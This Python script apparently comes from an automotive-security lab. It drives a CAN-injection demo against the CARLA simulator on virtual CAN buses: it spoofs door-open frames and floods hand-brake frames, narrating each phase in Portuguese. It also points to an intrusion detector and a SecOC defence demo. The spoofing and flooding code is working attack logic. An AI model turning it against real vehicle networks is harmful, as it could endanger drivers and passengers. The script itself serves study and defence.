#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Experiment #5 (orchestrated) — CAN Injection played against the live CARLA simulator.

Unlike attacks/can_injection_demo.py (a self-contained terminal simulation), this
runner drives the REAL vehicle: it injects frames on the attacker bus (vcan1,
bridged to vcan0 via can-gw) while the CARLA client window reacts on screen. It
reuses the project's spoof payloads from attacks/reverse_engineering.py, so the
frames are exactly the ones cyberattacks_module.py would send.

It narrates three phases in the terminal so you can present while watching CARLA:
  1) Normal traffic      — no injection; the car behaves normally.
  2) Door spoofing       — inject DOORS (0x60C): the door opens in CARLA.
  3) Hand-brake flood     — flood HAND_BRAKE (0x604): the hand brake engages and
                            the car cannot move; run the IDS to see it detected.

Prerequisites: bring the environment up first (./1_up_environment.sh), so that
CARLA, the CARLA client and vcan0/vcan1 are all running.

Usage:
  python -m attacks.can_injection_carla
  python -m attacks.can_injection_carla --observe 6 --duration 8
  python -m attacks.can_injection_carla --iface virtual   # dry smoke-test, no CARLA

To also see the intrusion being detected, run in another terminal:
  python intrusion_detection_module.py --detector id_time
"""
import argparse
import os
import sys
import time

import can

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO not in sys.path:
    sys.path.insert(0, REPO)

from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; D = "\033[2m"; X = "\033[0m"; B = "\033[1m"


def banner(t):
    print(f"\n{B}{'=' * 72}\n{t}\n{'=' * 72}{X}", flush=True)


def log(tag, msg, col=X):
    print(f"{D}{time.strftime('%H:%M:%S')}{X} {col}[{tag}]{X} {msg}", flush=True)


def burst(bus, feature, duration, period):
    """Inject a feature's spoofed frame for `duration` seconds at `period` spacing."""
    f = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
    msg = can.Message(arbitration_id=f["id"], data=f["payload"], is_extended_id=False)
    sent, t0 = 0, time.monotonic()
    while time.monotonic() - t0 < duration:
        bus.send(msg)
        sent += 1
        time.sleep(period)
    data_str = " ".join(f"{b:02X}" for b in f["payload"])
    log("ATAQUE", f"{R}{feature}: {sent} frames enviados  (ID=0x{f['id']:03X} DATA={data_str}){X}", R)


def main():
    parser = argparse.ArgumentParser(description="Experiment #5 orchestrated against the live CARLA.")
    parser.add_argument("--vcan", default="vcan1", help="Attacker CAN interface (default: vcan1, bridged to vcan0).")
    parser.add_argument("--iface", choices=["socketcan", "virtual"], default="socketcan",
                        help="python-can backend (default: socketcan; 'virtual' for a dry smoke-test).")
    parser.add_argument("--observe", type=float, default=5.0, help="Seconds of normal traffic before attacking (phase 1).")
    parser.add_argument("--duration", type=float, default=6.0, help="Seconds per attack phase.")
    parser.add_argument("--door-period", type=float, default=0.3, help="Spacing between door spoof frames (s).")
    parser.add_argument("--handbrake-period", type=float, default=0.001, help="Spacing between hand-brake flood frames (s).")
    args = parser.parse_args()

    print(f"{B}CAN Injection on CARLA{X}  iface={args.iface}  attacker-bus={args.vcan}")
    try:
        bus = can.interface.Bus(channel=args.vcan, interface=args.iface)
    except Exception as e:
        print(f"{R}[ERRO]{X} não foi possível abrir '{args.vcan}' ({args.iface}): {e}")
        print(f"{Y}Dica:{X} suba o ambiente primeiro com ./1_up_environment.sh "
              f"(cria vcan0/vcan1 e inicia o CARLA). Confira com: ip -br link show type vcan")
        sys.exit(1)

    try:
        banner("FASE 1  —  Tráfego normal (sem ataque)")
        log("INFO", "Observe o carro no CARLA: dirigível e com portas fechadas. Nenhuma injeção acontecendo.")
        log("INFO", f"{D}(opcional) rode em outro terminal: python intrusion_detection_module.py --detector id_time{X}")
        time.sleep(args.observe)

        banner("FASE 2  —  CAN INJECTION: spoof de DOORS (0x60C)")
        log("INFO", f"{R}>>> Olhe a janela do CARLA: a porta vai ABRIR sem comando do teclado.{X}")
        burst(bus, "doors", args.duration, args.door_period)

        banner("FASE 3  —  CAN INJECTION: flood de HAND_BRAKE (0x604)")
        log("INFO", f"{R}>>> O freio de mão vai ACIONAR e o carro não anda mesmo com acelerador.{X}")
        log("INFO", f"{Y}No terminal do IDS você verá os alertas de anomalia no 0x604.{X}")
        burst(bus, "hand_brake", args.duration, args.handbrake_period)
        log("INFO", f"{G}Ataque encerrado: o tráfego legítimo (HAND_BRAKE=0 a cada 200ms) solta o freio.{X}")

        banner("FASE 4  —  Defesa (conceitual nesta execução)")
        log("DEFESA", f"{C}Sem autenticação, o CARLA aceitou os frames forjados. A defesa SecOC/MAC que "
                      f"bloquearia o spoof está demonstrada no modo terminal:{X}", C)
        log("DEFESA", f"{C}   python -m attacks.can_injection_demo   (Fase 4){X}", C)

        banner("FIM")
        print(f"""  Fase 2  spoof de porta   -> porta abriu na janela do CARLA
  Fase 3  flood de freio   -> freio de mão travou o carro; IDS detecta a anomalia
  Fase 4  defesa SecOC/MAC -> ver attacks/can_injection_demo.py (terminal)""")
    except KeyboardInterrupt:
        print(f"\n{Y}Interrompido pelo usuário.{X}")
    finally:
        bus.shutdown()


if __name__ == "__main__":
    main()
